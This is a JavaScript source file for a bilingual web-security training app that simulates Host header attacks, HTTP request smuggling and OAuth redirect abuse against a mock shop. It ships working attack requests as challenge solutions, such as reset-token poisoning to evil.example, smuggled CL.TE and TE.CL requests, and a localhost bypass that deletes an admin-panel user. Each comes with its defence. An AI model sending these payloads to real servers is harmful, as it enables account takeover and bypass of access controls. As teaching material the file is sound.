import { L, htmlExec, parseReq, verdict } from './lib.js';

const neutral = (en, zh) => ({ verdict: 'neutral', message: L(en, zh) });
const SITE = 'shop.example';
const ADMIN = 'HTTP/1.1 200 OK\n\n<h1>Admin panel</h1>\nwiener  <a href="/admin/delete?username=wiener">Delete</a>\ncarlos  <a href="/admin/delete?username=carlos">Delete</a>';

/* ====================================================== Host header attacks */
const RESET_TOKEN = 'rT9-carlos-55x';
function hostRun(raw, { validateHost = false, xfh = true, routing = false, localAdmin = false } = {}) {
  const q = parseReq(raw);
  const host = (q.headers.host || '').trim();
  const log = [];
  if (routing) {
    if (host === SITE || host === '') return { log: [L(`load balancer routes to the public app`, '负载均衡器路由到公开应用')], response: q.path.startsWith('/admin') ? 'HTTP/1.1 404' : 'HTTP/1.1 200 OK\n\n<h1>Shop</h1>' };
    if (host === '192.168.0.143') {
      log.push(L('load balancer routes to 192.168.0.143 (internal admin)', '负载均衡器路由到 192.168.0.143（内部管理后台）'));
      if (q.path === '/admin') return { log, response: ADMIN, admin: true };
      if (q.path === '/admin/delete' && q.query.get('username')) return { log, response: `HTTP/1.1 302\n\nUser ${q.query.get('username')} deleted`, deleted: q.query.get('username'), admin: true };
      return { log, response: 'HTTP/1.1 404' };
    }
    if (/^192\.168\.0\.\d+$/.test(host)) return { log: [L(`load balancer routes to ${host}`, `负载均衡器路由到 ${host}`)], response: 'HTTP/1.1 504 Gateway Timeout' };
    if (/oast\.example$/.test(host)) return { log: [L(`📡 your listener: request from the load balancer for ${host}`, `📡 你的监听器：收到负载均衡器对 ${host} 的请求`)], response: 'HTTP/1.1 200 OK' };
    return { log: [L(`no route for ${host}`, `没有到 ${host} 的路由`)], response: 'HTTP/1.1 421 Misdirected Request' };
  }
  if (validateHost && host !== SITE) return { log: [L(`Host ${host} rejected`, `拒绝 Host ${host}`)], response: 'HTTP/1.1 403 "Invalid Host header"' };
  if (localAdmin && q.path.startsWith('/admin')) {
    if (host !== 'localhost') return { log: [L(`Host is ${host}: not local`, `Host 是 ${host}：不是本地`)], response: 'HTTP/1.1 401 "Admin interface only available to local users"' };
    log.push(L('Host: localhost → treated as a local user', 'Host: localhost → 被当作本地用户'));
    if (q.path === '/admin') return { log, response: ADMIN, admin: true };
    if (q.path === '/admin/delete' && q.query.get('username')) return { log, response: `HTTP/1.1 302\n\nUser ${q.query.get('username')} deleted`, deleted: q.query.get('username'), admin: true };
  }
  if (q.method === 'POST' && q.path === '/forgot-password') {
    const user = q.form.get('username');
    const linkHost = (xfh && q.headers['x-forwarded-host']) || host;
    const link = `https://${linkHost}/forgot-password?temp-forgot-password-token=${user === 'carlos' ? RESET_TOKEN : 'xY…'}`;
    log.push(L(`email to ${user}: “Reset your password: ${link}”`, `发给 ${user} 的邮件：“重置你的密码：${link}”`));
    const leaked = user === 'carlos' && linkHost !== SITE;
    if (leaked) log.push(L(`carlos clicks → 📡 your server logs GET /forgot-password?temp-forgot-password-token=${RESET_TOKEN}`, `carlos 点击 → 📡 你的服务器记录到 GET /forgot-password?temp-forgot-password-token=${RESET_TOKEN}`));
    return { log, response: 'HTTP/1.1 200 OK\n\nPlease check your email', leaked };
  }
  return { log, response: 'HTTP/1.1 200 OK\n\n<h1>Shop</h1>' };
}
const HOST_FIX = { label: L('Server', '服务器'), off: L('Trusts Host / X-Forwarded-Host', '信任 Host / X-Forwarded-Host'), on: L('Configured domain, no overrides', '使用配置的域名，不允许覆盖') };
function hostLab(opts, def, presets, goodEn, goodZh) {
  return {
    fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 4, default: def }],
    presets,
    defense: HOST_FIX,
    run({ values, defended }) {
      if (defended) {
        const q = parseReq(values.r);
        const bad = (q.headers.host || '').trim() !== SITE || q.headers['x-forwarded-host'];
        return { request: values.r, log: [bad ? L('🛡 Host not in allowlist / X-Forwarded-Host ignored; links use the configured domain', '🛡 Host 不在白名单 / 忽略 X-Forwarded-Host；链接使用配置的域名') : L('normal request', '正常请求')], response: bad ? 'HTTP/1.1 400 "Invalid Host"' : 'HTTP/1.1 200 OK', ...verdict(false, 'The Host header no longer decides anything.', 'Host 头不再决定任何事情。') };
      }
      const r = hostRun(values.r, opts);
      return { request: values.r, log: r.log, response: r.response, ...(r.leaked || r.admin ? verdict(true, goodEn, goodZh) : neutral('Nothing interesting.', '没有什么特别的。')) };
    },
  };
}

const hostHeader = {
  variants: [
    {
      id: 'reset',
      title: L('Password reset poisoning', '密码重置投毒'),
      summary: L('The reset email’s link is built from the Host header. Request a reset for the victim with your own domain as Host; when they click, the token comes to you.', '重置邮件中的链接是用 Host 头构造的。用你自己的域名作为 Host，为受害者申请重置；当他们点击时，令牌就会送到你手上。'),
      lab: hostLab({}, `POST /forgot-password HTTP/1.1\nHost: evil.example\n\nusername=carlos`, [
        { label: L('Normal', '正常'), values: { r: `POST /forgot-password HTTP/1.1\nHost: ${SITE}\n\nusername=carlos` } },
        { label: 'Host: evil.example', values: { r: `POST /forgot-password HTTP/1.1\nHost: evil.example\n\nusername=carlos` } },
      ], 'The victim’s reset token was delivered to your server.', '受害者的重置令牌被送到了你的服务器。'),
    },
    {
      id: 'xfh',
      title: L('Override headers', '覆盖类请求头'),
      summary: L('Host is validated, but the framework prefers X-Forwarded-Host when building absolute URLs.', 'Host 会被校验，但框架在构造绝对 URL 时优先使用 X-Forwarded-Host。'),
      lab: hostLab({ validateHost: true }, `POST /forgot-password HTTP/1.1\nHost: ${SITE}\nX-Forwarded-Host: evil.example\n\nusername=carlos`, [
        { label: 'Host: evil.example', values: { r: `POST /forgot-password HTTP/1.1\nHost: evil.example\n\nusername=carlos` } },
        { label: 'X-Forwarded-Host', values: { r: `POST /forgot-password HTTP/1.1\nHost: ${SITE}\nX-Forwarded-Host: evil.example\n\nusername=carlos` } },
      ], 'Host passed validation; the override header poisoned the link.', 'Host 通过了校验；覆盖头污染了链接。'),
    },
    {
      id: 'auth',
      title: L('Authentication bypass', '绕过认证'),
      summary: L('The admin panel is “only for local users”, and the app decides that by looking at the Host header.', '管理面板“只对本地用户开放”，而应用通过 Host 头来判断。'),
      lab: hostLab({ localAdmin: true }, `GET /admin HTTP/1.1\nHost: localhost`, [
        { label: `Host: ${SITE}`, values: { r: `GET /admin HTTP/1.1\nHost: ${SITE}` } },
        { label: 'Host: localhost', values: { r: `GET /admin HTTP/1.1\nHost: localhost` } },
      ], 'Admin panel served to a “local” user.', '管理面板被提供给了一个“本地”用户。'),
    },
    {
      id: 'routing',
      title: L('Routing-based SSRF', '基于路由的 SSRF'),
      summary: L('A load balancer forwards requests to whatever host the Host header names, including internal IPs. First prove it with your own domain, then scan the internal range.', '负载均衡器会把请求转发到 Host 头指定的任何主机，包括内网 IP。先用你自己的域名证明这一点，再扫描内网网段。'),
      lab: hostLab({ routing: true }, `GET /admin HTTP/1.1\nHost: 192.168.0.143`, [
        { label: 'Host: k3x9.oast.example', values: { r: `GET / HTTP/1.1\nHost: k3x9.oast.example` } },
        { label: 'Host: 192.168.0.1', values: { r: `GET /admin HTTP/1.1\nHost: 192.168.0.1` } },
        { label: 'Host: 192.168.0.143', values: { r: `GET /admin HTTP/1.1\nHost: 192.168.0.143` } },
      ], 'The load balancer delivered you to an internal admin panel.', '负载均衡器把你送到了内部管理面板。'),
    },
  ],
  challenges: [
    {
      title: L('Poison the reset link', '污染重置链接'),
      goal: L('The server rejects any Host other than shop.example. Get carlos’s password-reset token sent to evil.example.', '服务器拒绝 shop.example 以外的任何 Host。让 carlos 的密码重置令牌被发送到 evil.example。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 4, default: `POST /forgot-password HTTP/1.1\nHost: ${SITE}\n\nusername=wiener` }],
      run({ r }) {
        return hostRun(r, { validateHost: true });
      },
      check: (v, o) => o.leaked,
      hint: L('Keep Host valid and add a header that frameworks use behind proxies.', '保持 Host 合法，再加一个框架在代理后面会用到的请求头。'),
      solution: `POST /forgot-password HTTP/1.1\nHost: ${SITE}\nX-Forwarded-Host: evil.example\n\nusername=carlos`,
      explain: L('Never build security-sensitive URLs from request headers. Use a configured base URL.', '永远不要用请求头来构造安全敏感的 URL。使用配置好的基础 URL。'),
    },
    {
      title: L('Be localhost', '变成 localhost'),
      goal: L('/admin is “only available to local users”. Delete carlos.', '/admin“只对本地用户开放”。删除 carlos。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 3, default: `GET /admin HTTP/1.1\nHost: ${SITE}` }],
      run({ r }) {
        return hostRun(r, { localAdmin: true });
      },
      check: (v, o) => o.deleted === 'carlos',
      hint: L('What does a request from the machine itself usually say in its Host header?', '从本机发出的请求，Host 头里通常写的是什么？'),
      solution: 'GET /admin/delete?username=carlos HTTP/1.1\nHost: localhost',
      explain: L('Host is attacker-controlled. Decide “local” from the network connection, and better, protect admin with real authentication.', 'Host 由攻击者控制。用网络连接判断是否“本地”，更好的做法是用真正的认证来保护管理后台。'),
    },
    {
      title: L('Ride the load balancer', '搭上负载均衡器'),
      goal: L('The load balancer routes by Host header. An admin panel lives on some host in 192.168.0.0/24. Delete carlos.', '负载均衡器按 Host 头路由。某个管理面板位于 192.168.0.0/24 内的某台主机上。删除 carlos。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 3, default: `GET /admin HTTP/1.1\nHost: 192.168.0.1` }],
      run({ r }) {
        return hostRun(r, { routing: true });
      },
      check: (v, o) => o.deleted === 'carlos',
      hint: L('In practice: Burp Intruder over the last octet. Here: it is between .140 and .150. Uncheck “update Host header to match target” in Burp so your Host survives.', '实践中：用 Burp Intruder 遍历最后一段。这里：它在 .140 到 .150 之间。在 Burp 里取消勾选“update Host header to match target”，你的 Host 才能保留下来。'),
      solution: 'GET /admin/delete?username=carlos HTTP/1.1\nHost: 192.168.0.143',
      explain: L('Reverse proxies must route only to an allowlist of back-ends, never to whatever the client names.', '反向代理只能路由到白名单中的后端，绝不能路由到客户端随意指定的地方。'),
    },
  ],
  cases: [
    { year: '2013', ref: L('James Kettle (skeletonscribe)', 'James Kettle（skeletonscribe）'), title: L('Practical HTTP Host header attacks', '实用的 HTTP Host 头攻击'), what: L('James Kettle’s 2013 research showed that popular applications and frameworks, including Django and Joomla, generated password-reset links from the Host header, so attackers could receive victims’ reset tokens. It also covered poisoning caches with the Host header.', 'James Kettle 2013 年的研究表明，包括 Django 和 Joomla 在内的流行应用和框架会用 Host 头生成密码重置链接，因此攻击者可以收到受害者的重置令牌。研究还涉及利用 Host 头对缓存投毒。'), lesson: L('Host is user input, even though browsers set it automatically.', '即使浏览器会自动设置 Host，它仍然是用户输入。') },
  ],
};

/* ====================================================== Request smuggling */
const CRLF = (t) => t.replace(/\r/g, '').replace(/\n/g, '\r\n');
const VICTIM = `POST / HTTP/1.1\r\nHost: ${SITE}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 3\r\n\r\nx=1`;
/** Parse one request from a byte stream. mode: 'CL' | 'TE' | 'TE-loose' | 'TE-strict'. */
function parseOne(s, mode) {
  const end = s.indexOf('\r\n\r\n');
  if (end < 0) return { err: 'incomplete headers' };
  const lines = s.slice(0, end).split('\r\n');
  const start = lines.shift();
  const hs = lines.map((l) => {
    const i = l.indexOf(':');
    return [l.slice(0, i), l.slice(i + 1).trim()];
  });
  const cl = hs.find(([n]) => n.trim().toLowerCase() === 'content-length');
  const tes = hs.filter(([n]) => n.trim().toLowerCase() === 'transfer-encoding');
  let useTE = false;
  if (mode === 'TE' || mode === 'TE-loose') useTE = tes.some(([, v]) => /chunked/i.test(v));
  if (mode === 'TE-strict') useTE = tes.length === 1 && tes[0][0] === 'Transfer-Encoding' && tes[0][1] === 'chunked';
  const bodyStart = end + 4;
  if (useTE) {
    let i = bodyStart;
    for (;;) {
      const nl = s.indexOf('\r\n', i);
      if (nl < 0) return { err: 'timeout waiting for next chunk' };
      const size = parseInt(s.slice(i, nl), 16);
      if (Number.isNaN(size)) return { err: 'invalid chunk size' };
      i = nl + 2;
      if (size === 0) {
        if (s.slice(i, i + 2) === '\r\n') i += 2;
        return { start, consumed: i, framing: 'chunked' };
      }
      if (s.length < i + size) return { err: 'timeout waiting for chunk data' };
      i += size;
      if (s.slice(i, i + 2) === '\r\n') i += 2;
    }
  }
  const n = cl ? parseInt(cl[1], 10) : 0;
  if (s.length < bodyStart + n) return { err: `timeout: Content-Length ${n} but only ${s.length - bodyStart} bytes`, start };
  return { start, consumed: bodyStart + n, framing: `Content-Length: ${n}` };
}
function smuggle(text, front, back, { blockAdmin = false, strictBoth = false } = {}) {
  const s = CRLF(text);
  const log = [];
  if (strictBoth) {
    const hasCL = /\r\ncontent-length\s*:/i.test(s.split('\r\n\r\n')[0]);
    const hasTE = /\r\ntransfer-encoding\s*:/i.test(s.split('\r\n\r\n')[0]);
    if (hasCL && hasTE) return { log: [L('🛡 front-end: both Content-Length and Transfer-Encoding → 400', '🛡 前端：同时存在 Content-Length 和 Transfer-Encoding → 400')], response: 'HTTP/1.1 400 Bad Request', leftover: '', next: null };
  }
  const f = parseOne(s, front);
  if (f.err) return { log: [L(`front-end: ${f.err}`, `前端：${f.err}`)], response: 'HTTP/1.1 500 / timeout', leftover: '', next: null };
  if (blockAdmin && / \/admin/i.test(f.start)) return { log: [L('front-end: /admin is blocked', '前端：/admin 被拦截')], response: 'HTTP/1.1 403', leftover: '', next: null };
  const forwarded = s.slice(0, f.consumed);
  log.push(L(`front-end (${f.framing}) forwards ${f.consumed} bytes`, `前端（${f.framing}）转发 ${f.consumed} 字节`));
  const b = parseOne(forwarded + VICTIM, back);
  if (b.err) return { log: [...log, L(`back-end: ${b.err}`, `后端：${b.err}`)], response: 'HTTP/1.1 500 / timeout', leftover: '', next: null };
  if (b.consumed > forwarded.length) {
    log.push(L(`back-end (${b.framing}) read past the request into the next one`, `后端（${b.framing}）越过了本请求，读进了下一个请求`));
    return { log, response: 'HTTP/1.1 200 OK (but the next user’s request was swallowed)', leftover: '', next: forwarded.length + VICTIM.length > b.consumed ? (forwarded + VICTIM).slice(b.consumed) : null };
  }
  const leftover = forwarded.slice(b.consumed);
  log.push(L(`back-end (${b.framing}) reads ${b.consumed} bytes; ${leftover.length} bytes left in the buffer`, `后端（${b.framing}）读取 ${b.consumed} 字节；缓冲区剩余 ${leftover.length} 字节`));
  const next = leftover + VICTIM;
  const nextLine = next.split('\r\n')[0];
  log.push(L(`next request on this connection starts: ${JSON.stringify(nextLine)}`, `该连接上的下一个请求以此开头：${JSON.stringify(nextLine)}`));
  let response = 'HTTP/1.1 200 OK';
  if (leftover) {
    const method = nextLine.split(' ')[0];
    const nq = parseReq(next.replace(/\r/g, ''));
    if (!['GET', 'POST', 'HEAD'].includes(method)) response = `→ next user receives: HTTP/1.1 403 "Unrecognized method ${method}"`;
    else if (nq.path === '/admin' || nq.path === '/admin/delete') {
      const firstHost = /\nhost:\s*([^\r\n]*)/i.exec(next.replace(/\r/g, ''));
      const local = Boolean(firstHost && firstHost[1].trim().startsWith('localhost'));
      response = local ? (nq.path === '/admin/delete' ? `→ HTTP/1.1 302 "User ${nq.query.get('username')} deleted"` : `→ ${ADMIN}`) : '→ HTTP/1.1 401 "Admin interface only available to local users"';
    } else response = '→ next user receives an unexpected response';
  }
  return { log, response, leftover: leftover.replace(/\r/g, ''), next };
}
const SMUG_FIX = { label: L('Infrastructure', '基础设施'), off: L('Front-end and back-end disagree', '前后端解析不一致'), on: L('Reject CL+TE / HTTP/2 end-to-end', '拒绝 CL+TE / 端到端 HTTP/2') };
function smugLab(front, back, def, presets, opts = {}) {
  return {
    fields: [{ id: 'r', label: L('Raw request (each line break = \\r\\n, 2 bytes)', '原始请求（每个换行 = \\r\\n，2 字节）'), rows: 9, default: def }],
    presets,
    defense: SMUG_FIX,
    run({ values, defended }) {
      const r = smuggle(values.r, front, back, { ...opts, strictBoth: defended });
      return { request: L(`front-end: ${front}, back-end: ${back}`, `前端：${front}，后端：${back}`), log: r.log, response: r.response, ...(r.leftover ? verdict(true, `Smuggled: “${r.leftover.split('\n')[0]}…” was glued onto the next request.`, `走私成功：“${r.leftover.split('\n')[0]}…”被粘到了下一个请求前面。`) : defended ? verdict(false, 'Ambiguous requests are refused.', '有歧义的请求被拒绝。') : neutral('Both servers agree on where the request ends.', '两台服务器对请求在哪里结束达成了一致。')) };
    },
  };
}
const CLTE = `POST / HTTP/1.1\nHost: ${SITE}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG`;
const TECL = `POST / HTTP/1.1\nHost: ${SITE}\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n\n`;
const TETE = `POST / HTTP/1.1\nHost: ${SITE}\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: cow\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n\n`;
const NORMAL = `POST / HTTP/1.1\nHost: ${SITE}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 3\n\nx=1`;
const ADMIN_SMUG = `POST / HTTP/1.1\nHost: ${SITE}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nX-Ignore: X`;

const smuggling = {
  variants: [
    {
      id: 'clte',
      title: 'CL.TE',
      summary: L('The front-end uses Content-Length, the back-end uses Transfer-Encoding. The back-end stops at the 0 chunk; whatever follows waits in the buffer and becomes the start of the next request.', '前端使用 Content-Length，后端使用 Transfer-Encoding。后端在 0 分块处停止；后面的内容留在缓冲区里，变成下一个请求的开头。'),
      lab: smugLab('CL', 'TE', CLTE, [
        { label: L('Normal', '正常'), values: { r: NORMAL } },
        { label: 'CL.TE “G”', values: { r: CLTE } },
      ]),
    },
    {
      id: 'tecl',
      title: 'TE.CL',
      summary: L('The front-end uses Transfer-Encoding, the back-end uses Content-Length. The back-end reads only the first few bytes of the chunked body; the rest of the chunk is a whole smuggled request.', '前端使用 Transfer-Encoding，后端使用 Content-Length。后端只读取分块请求体的前几个字节；分块里剩下的部分就是一个完整的走私请求。'),
      lab: smugLab('TE', 'CL', TECL, [
        { label: L('Normal', '正常'), values: { r: NORMAL } },
        { label: 'TE.CL GPOST', values: { r: TECL } },
      ]),
      takeaway: L('In Burp Repeater, turn off “Update Content-Length” for these attacks, and remember the trailing \\r\\n\\r\\n after the 0.', '在 Burp Repeater 中做这类攻击时要关闭“Update Content-Length”，并记住 0 后面还有 \\r\\n\\r\\n。'),
    },
    {
      id: 'tete',
      title: L('TE.TE (obfuscated header)', 'TE.TE（混淆请求头）'),
      summary: L('Both servers support chunked encoding, but one can be made to ignore it with an odd duplicate header. Then it falls back to Content-Length, giving you TE.CL.', '两台服务器都支持分块编码，但可以用一个奇怪的重复头让其中一台忽略它。于是它退回到 Content-Length，变成了 TE.CL。'),
      lab: smugLab('TE-loose', 'TE-strict', TETE, [
        { label: L('Single TE', '单个 TE'), values: { r: TECL } },
        { label: 'Transfer-encoding: cow', values: { r: TETE } },
      ]),
    },
    {
      id: 'bypass',
      title: L('Bypassing front-end controls', '绕过前端控制'),
      summary: L('The front-end blocks /admin, but it never sees the smuggled request. The back-end processes it as if it came from the next user.', '前端会拦截 /admin，但它根本看不到被走私的请求。后端会把它当作来自下一个用户的请求来处理。'),
      lab: smugLab('CL', 'TE', ADMIN_SMUG.replace('/admin/delete?username=carlos', '/admin').replace('Content-Length: 77', 'Content-Length: 54'), [
        { label: 'GET /admin', values: { r: `GET /admin HTTP/1.1\nHost: ${SITE}\n\n` } },
        { label: L('Smuggled /admin', '走私 /admin'), values: { r: ADMIN_SMUG.replace('/admin/delete?username=carlos', '/admin').replace('Content-Length: 77', 'Content-Length: 54') } },
      ], { blockAdmin: true }),
    },
  ],
  challenges: [
    {
      title: L('GPOST (CL.TE)', 'GPOST（CL.TE）'),
      goal: L('Front-end: Content-Length. Back-end: chunked. Make the next request on the connection start with the method GPOST.', '前端：Content-Length。后端：分块编码。让该连接上的下一个请求以 GPOST 方法开头。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 9, default: NORMAL }],
      run({ r }) {
        const x = smuggle(r, 'CL', 'TE');
        return { log: x.log, response: x.response, x };
      },
      check: (v, o) => (o.x.next || '').startsWith('GPOST'),
      hint: L('Add Transfer-Encoding: chunked, end the chunked body with 0 and a blank line, then put a single G. Content-Length must cover everything after the headers (each line break is 2 bytes).', '加上 Transfer-Encoding: chunked，用 0 和一个空行结束分块请求体，然后放一个 G。Content-Length 必须覆盖请求头之后的所有内容（每个换行算 2 字节）。'),
      solution: CLTE,
      explain: L('The back-end thought the request ended after 0\\r\\n\\r\\n, so “G” became the first byte of the next request. Make every server in the chain parse requests the same way, or reject ambiguous ones.', '后端认为请求在 0\\r\\n\\r\\n 之后就结束了，所以“G”成了下一个请求的第一个字节。让链路中的每台服务器以相同方式解析请求，或者拒绝有歧义的请求。'),
    },
    {
      title: L('GPOST (TE.CL)', 'GPOST（TE.CL）'),
      goal: L('Now the front-end uses chunked and the back-end uses Content-Length. Make the next request start with GPOST.', '现在前端使用分块编码，后端使用 Content-Length。让下一个请求以 GPOST 开头。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 12, default: NORMAL }],
      run({ r }) {
        const x = smuggle(r, 'TE', 'CL');
        return { log: x.log, response: x.response, x };
      },
      check: (v, o) => (o.x.next || '').startsWith('GPOST'),
      hint: L('Content-Length: 4 covers just the chunk-size line (e.g. “5c\\r\\n”). The chunk itself is a full GPOST request; its size in hex must be exact, followed by 0 and a blank line.', 'Content-Length: 4 只覆盖分块大小那一行（如“5c\\r\\n”）。分块本身是一个完整的 GPOST 请求，它的十六进制大小必须精确，后面跟着 0 和一个空行。'),
      solution: TECL,
      explain: L('The smuggled request has its own Content-Length, which swallows the start of the next user’s request as its body. Getting the byte counts right is most of the work.', '被走私的请求有自己的 Content-Length，它会把下一个用户请求的开头吞作自己的请求体。把字节数算对，就完成了大部分工作。'),
    },
    {
      title: L('Delete carlos past the front-end', '越过前端删除 carlos'),
      goal: L('The front-end (Content-Length) blocks /admin; the back-end (chunked) allows /admin for Host: localhost. Smuggle a request that deletes carlos.', '前端（Content-Length）会拦截 /admin；后端（分块编码）对 Host: localhost 开放 /admin。走私一个删除 carlos 的请求。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 10, default: `GET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\n\n` }],
      run({ r }) {
        const x = smuggle(r, 'CL', 'TE', { blockAdmin: true });
        return { log: x.log, response: x.response, x };
      },
      check: (v, o) => /User carlos deleted/.test(o.x.response),
      hint: L('CL.TE: body = “0”, blank line, then the smuggled request ending with a dummy header like X-Ignore: X (no final newline) so the next request line is absorbed into it. Count every byte for Content-Length.', 'CL.TE：请求体 = “0”、空行，然后是走私的请求，结尾放一个像 X-Ignore: X 这样的占位头（不要最后的换行），让下一个请求行被吸收进去。为 Content-Length 数清每个字节。'),
      solution: ADMIN_SMUG,
      explain: L('Access controls at the front-end only see what the front-end parses. Smuggling makes requests invisible to it.', '前端的访问控制只能看到前端解析出的内容。走私让请求对它隐身。'),
    },
  ],
  cases: [
    { year: '2005', ref: L('Watchfire', 'Watchfire'), title: L('HTTP Request Smuggling is described', 'HTTP 请求走私首次被描述'), what: L('Researchers at Watchfire (Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin) published the first detailed paper on HTTP request smuggling, showing how disagreements between proxies and servers about request boundaries enable cache poisoning and filter bypasses.', 'Watchfire 的研究人员（Chaim Linhart、Amit Klein、Ronen Heled 和 Steve Orrin）发表了第一篇关于 HTTP 请求走私的详细论文，展示了代理与服务器对请求边界的分歧如何导致缓存投毒和过滤绕过。'), lesson: L('An old idea that stayed underexplored for years.', '一个老想法，却多年无人深挖。') },
    { year: '2019', ref: L('James Kettle: HTTP Desync Attacks', 'James Kettle：HTTP Desync 攻击'), title: L('Request smuggling reborn', '请求走私重生'), what: L('At Black Hat USA 2019, James Kettle showed practical CL.TE and TE.CL attacks against major sites and CDNs, including hijacking other users’ requests, and released tooling to detect desync safely. He earned substantial bug bounties in the process.', '在 2019 年 Black Hat USA 上，James Kettle 展示了针对大型网站和 CDN 的实用 CL.TE 和 TE.CL 攻击，包括劫持其他用户的请求，并发布了安全检测 desync 的工具。他也因此获得了可观的漏洞赏金。'), lesson: L('Every hop in a proxy chain is a parser that can disagree.', '代理链中的每一跳都是一个可能产生分歧的解析器。') },
  ],
};

/* ====================================================== OAuth */
const CLIENT_ID = 'shop-web';
function authorize(url, { validate = 'none' } = {}) {
  let u;
  try {
    u = new URL(url);
  } catch {
    return { err: L('invalid URL', 'URL 无效') };
  }
  if (u.hostname !== 'oauth.example' || u.pathname !== '/auth') return { err: L('not the OAuth server’s /auth endpoint', '不是 OAuth 服务器的 /auth 接口') };
  if (u.searchParams.get('client_id') !== CLIENT_ID) return { err: L('unknown client_id', '未知的 client_id') };
  const redir = u.searchParams.get('redirect_uri') || '';
  const type = u.searchParams.get('response_type') || 'code';
  if (validate === 'exact' && redir !== `https://${SITE}/oauth-callback`) return { err: L('redirect_uri mismatch', 'redirect_uri 不匹配') };
  if (validate === 'prefix' && !redir.startsWith(`https://${SITE}/oauth-callback`)) return { err: L('redirect_uri must start with the registered callback', 'redirect_uri 必须以已注册的回调地址开头') };
  const secret = type === 'token' ? '#access_token=ya29.carlos-T0k' : '?code=c4rl0s-C0de';
  let dest;
  try {
    dest = new URL(redir);
  } catch {
    return { err: L('invalid redirect_uri', 'redirect_uri 无效') };
  }
  return { redir, type, secret, dest };
}
/** Follow the redirect as a browser would, through the client’s open redirect. */
function browserFollow(a) {
  const log = [L(`carlos (logged in at oauth.example) is sent to ${a.redir}${a.secret}`, `carlos（已登录 oauth.example）被送往 ${a.redir}${a.secret}`)];
  let d = a.dest;
  if (d.hostname === SITE && d.pathname === '/post/next' && d.searchParams.get('path')) {
    log.push(L(`browser resolves the path to ${d.pathname}; the site redirects to ${d.searchParams.get('path')}`, `浏览器把路径解析为 ${d.pathname}；站点重定向到 ${d.searchParams.get('path')}`));
    try {
      d = new URL(d.searchParams.get('path'));
    } catch {
      return { log, host: SITE };
    }
    if (a.type === 'code') log.push(L('the code was in the query string and is lost in the redirect', 'code 在查询字符串里，重定向时丢失了'));
    else log.push(L('the #fragment survives the redirect', '#片段在重定向后依然保留'));
    return { log, host: d.hostname, carried: a.type === 'token' };
  }
  return { log, host: d.hostname, carried: true };
}

const oauth = {
  variants: [
    {
      id: 'implicit',
      title: L('Implicit flow: trusting the client', '隐式流程：信任客户端'),
      summary: L('After the implicit flow, the browser POSTs the user’s details and the token to the shop, which logs in as the email it is told, without checking the token belongs to it.', '隐式流程结束后，浏览器把用户信息和令牌 POST 给商店，而商店按被告知的邮箱登录，却不检查令牌是否属于这个邮箱。'),
      lab: {
        fields: [{ id: 'b', label: L('POST /authenticate body', 'POST /authenticate 请求体'), rows: 2, default: '{"email":"carlos@carlos-montoya.net","username":"carlos","token":"ya29.wiener-T0k"}' }],
        presets: [
          { label: L('Your own', '你自己的'), values: { b: '{"email":"wiener@hotdog.com","username":"wiener","token":"ya29.wiener-T0k"}' } },
          { label: L('Swap the email', '换掉邮箱'), values: { b: '{"email":"carlos@carlos-montoya.net","username":"carlos","token":"ya29.wiener-T0k"}' } },
        ],
        defense: { label: L('Client', '客户端'), off: L('Trusts posted email', '信任提交的邮箱'), on: L('Looks up /userinfo with the token', '用令牌查询 /userinfo') },
        run({ values, defended }) {
          let j;
          try {
            j = JSON.parse(values.b);
          } catch {
            return { request: values.b, log: [], response: 'HTTP/1.1 400', ...neutral('Bad JSON.', 'JSON 格式错误。') };
          }
          const who = defended ? (j.token === 'ya29.wiener-T0k' ? 'wiener' : null) : (j.email || '').split('@')[0];
          return { request: `POST /authenticate\n\n${values.b}`, log: [defended ? L('GET oauth.example/me with the token → wiener', '用令牌请求 oauth.example/me → wiener') : L('session created for the posted email', '为提交的邮箱创建了会话')], response: who ? `HTTP/1.1 302 → /my-account?id=${who}` : 'HTTP/1.1 401', ...(who && who !== 'wiener' ? verdict(true, `Logged in as ${who}.`, `以 ${who} 身份登录了。`) : defended ? verdict(false, 'The identity comes from the provider, not the browser.', '身份来自身份提供方，而不是浏览器。') : neutral('Your own account.', '你自己的账号。')) };
        },
      },
    },
    {
      id: 'redirect',
      title: L('Unvalidated redirect_uri', '未校验的 redirect_uri'),
      summary: L('If the OAuth server sends the code to any redirect_uri, an attacker link makes a logged-in victim’s browser deliver their code to the attacker.', '如果 OAuth 服务器会把授权码发送到任意 redirect_uri，攻击者的链接就能让已登录受害者的浏览器把授权码交给攻击者。'),
      lab: {
        fields: [{ id: 'u', label: L('Link you send to carlos', '你发给 carlos 的链接'), rows: 2, default: `https://oauth.example/auth?client_id=${CLIENT_ID}&redirect_uri=https://evil.example/cb&response_type=code&scope=openid` }],
        presets: [
          { label: L('Legit', '正常'), values: { u: `https://oauth.example/auth?client_id=${CLIENT_ID}&redirect_uri=https://${SITE}/oauth-callback&response_type=code&scope=openid` } },
          { label: 'evil.example', values: { u: `https://oauth.example/auth?client_id=${CLIENT_ID}&redirect_uri=https://evil.example/cb&response_type=code&scope=openid` } },
        ],
        defense: { label: 'redirect_uri', off: L('Any', '任意'), on: L('Exact match', '精确匹配') },
        run({ values, defended }) {
          const a = authorize(values.u, { validate: defended ? 'exact' : 'none' });
